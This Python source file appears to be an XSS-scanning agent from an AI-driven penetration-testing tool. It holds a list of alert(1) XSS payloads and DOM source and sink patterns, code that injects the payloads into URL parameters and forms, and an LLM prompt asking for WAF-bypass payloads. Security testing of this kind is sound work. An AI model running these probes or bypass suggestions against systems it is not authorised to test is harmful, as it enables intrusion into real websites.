import logging
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

from core.entropy import shannon_entropy, relative_entropy
from tools.http_client import HTTPClient
from core.entropy import calculate_distribution, kl_divergence
from core.agent_base import BaseAgent, Finding

logger = logging.getLogger("specter.xss")

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    '<body onload=alert(1)>',
    '{{constructor.constructor("alert(1)")()}}',
    '<iframe src="javascript:alert(1)">',
    '<details open ontoggle=alert(1)>',
    '" onmouseover="alert(1)',
]

DOM_SOURCES = [
    "document.location",
    "document.URL",
    "document.referrer",
    "location.href",
    "location.search",
    "location.hash",
    "window.name",
]

DOM_SINKS = [
    "innerHTML",
    "outerHTML",
    "document.write",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "location.href",
    "src=",
]


class XSSAgent(BaseAgent):
    def __init__(self, router, target, config):
        super().__init__(router, target, config)
        self.name = "XSSAgent"
        self.http = HTTPClient()
        # Initialize session manager for baseline functionality
        from core.session import SessionManager
        self.session_manager = SessionManager()

    def system_prompt(self):
        return (
            f"You are an XSS expert pentester. Target: {self.target}\n"
            "Analyze test results for reflected, stored, and DOM XSS.\n"
            "Only confirm if the payload is actually reflected unescaped.\n"
            "Provide browser-ready PoC URLs."
        )

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _test_reflected_xss(self, url: str, param: str) -> dict | None:
        from core.entropy import relative_entropy
        from core.structural_entropy import StructuralAnalyzer

        # Get baseline for relative entropy calculation
        baseline = self.http.get(url)
        baseline_text = baseline.text if baseline else ""

        # Get baseline distribution for relative entropy calculation
        baseline_data = self.http.capture_baseline(url)

        # Save baseline to session if we have a session
        if hasattr(self, 'session') and self.session:
            self.session_manager.save_baseline(self.session, url, baseline_data)

        for payload in XSS_PAYLOADS:
            # Skip low‑entropy payloads per config
            if shannon_entropy(payload) < self.config.get('entropy', {}).get('min_entropy', 3.0):
                continue
            test_url = self._inject_param(url, param, payload)
            resp = self.http.get(test_url)
            if not resp:
                continue
            if payload in resp.text or payload.lower() in resp.text.lower():
                # Calculate relative entropy to check for "High Interest" payloads
                if baseline_text and resp.text:
                    rel_entropy = relative_entropy(baseline_text, resp.text)
                    # If relative entropy is high, flag as "High Interest"
                    if rel_entropy > self.config.get('entropy', {}).get('min_entropy', 3.0):
                        return {
                            "param":   param,
                            "payload": payload,
                            "url":     test_url,
                        }
                return {
                    "param":   param,
                    "payload": payload,
                    "url":     test_url,
                }
        return None

    def _test_stored_xss_forms(self, url: str) -> list:
        results = []
        forms = self.http.get_forms(url)
        for form in forms:
            for inp in form["inputs"]:
                if not inp["name"] or inp["type"] in ["hidden", "submit", "button"]:
                    continue
                for payload in XSS_PAYLOADS[:4]:  # test first 4 payloads per field
                    data = {i["name"]: i["value"] or "test" for i in form["inputs"]}
                    data[inp["name"]] = payload
                    action = form["action"] or url
                    if not action.startswith("http"):
                        parsed = urlparse(url)
                        action = f"{parsed.scheme}://{parsed.netloc}{action}"

                    if form["method"] == "POST":
                        resp = self.http.post(action, data=data)
                    else:
                        resp = self.http.get(action, params=data)

                    if not resp:
                        continue

                    # Check if reflected in response
                    if payload in resp.text:
                        results.append({
                            "field":   inp["name"],
                            "payload": payload,
                            "url":     action,
                            "method":  form["method"],
                        })
                        break  # Found one payload for this field, move on
        return results

    def _check_dom_xss(self, url: str) -> list:
        """Check JavaScript for dangerous DOM patterns."""
        resp = self.http.get(url)
        if not resp:
            return []

        issues = []
        js_content = resp.text

        for source in DOM_SOURCES:
            for sink in DOM_SINKS:
                # Crude but effective pattern check
                if source in js_content and sink in js_content:
                    issues.append(f"Possible DOM XSS: {source} → {sink}")

        return issues

    def run(self) -> list:
        from rich.console import Console
        console = Console()
        console.print(f"\n[bold cyan][ XSSAgent ][/bold cyan] Target: {self.target}")

        # 1. Reflected XSS in URL params
        parsed = urlparse(self.target)
        params = list(parse_qs(parsed.query).keys())
        console.print(f"  [→] Testing {len(params)} URL params for reflected XSS...")

        for param in params:
            result = self._test_reflected_xss(self.target, param)
            if result:
                self.add_finding(
                    severity="HIGH",
                    title=f"Reflected XSS in parameter '{param}'",
                    description=f"Payload is reflected unescaped in the HTTP response.",
                    poc=result["url"],
                    remediation="HTML-encode all user input before rendering. Implement a strict Content-Security-Policy.",
                    endpoint=self.target,
                )

        # 2. Stored XSS via forms
        console.print("  [→] Testing forms for stored/reflected XSS...")
        stored = self._test_stored_xss_forms(self.target)
        for r in stored:
            self.add_finding(
                severity="HIGH",
                title=f"XSS in form field '{r['field']}' ({r['method']})",
                description=f"Payload reflected in response after form submission.",
                poc=f"Submit: {r['payload']} → field: {r['field']} at {r['url']}",
                remediation="Encode output, validate input, use CSP headers.",
                endpoint=r["url"],
            )

        # 3. DOM XSS check
        console.print("  [→] Checking for DOM XSS patterns...")
        dom_issues = self._check_dom_xss(self.target)
        for issue in dom_issues:
            self.add_finding(
                severity="MEDIUM",
                title="Potential DOM XSS Pattern",
                description=issue,
                poc=f"Manual review required at {self.target}",
                remediation="Avoid passing URL/location data to innerHTML, eval, or document.write.",
                endpoint=self.target,
            )

        # 4. LLM analysis
        if not self.findings:
            console.print("  [→] LLM deeper analysis...")
            forms = self.http.get_forms(self.target)
            prompt = (
                f"XSS scan on {self.target} found no obvious vulnerabilities.\n"
                f"Forms found: {forms}\n"
                f"URL params: {params}\n"
                "Suggest advanced XSS payloads or contexts I might have missed (WAF bypass, encoding tricks, etc)."
            )
            advice = self.think(prompt)
            console.print(f"\n[dim]{advice[:600]}[/dim]\n")

        console.print(f"[green][ XSSAgent ][/green] Complete — {len(self.findings)} finding(s)\n")
        return self.findings
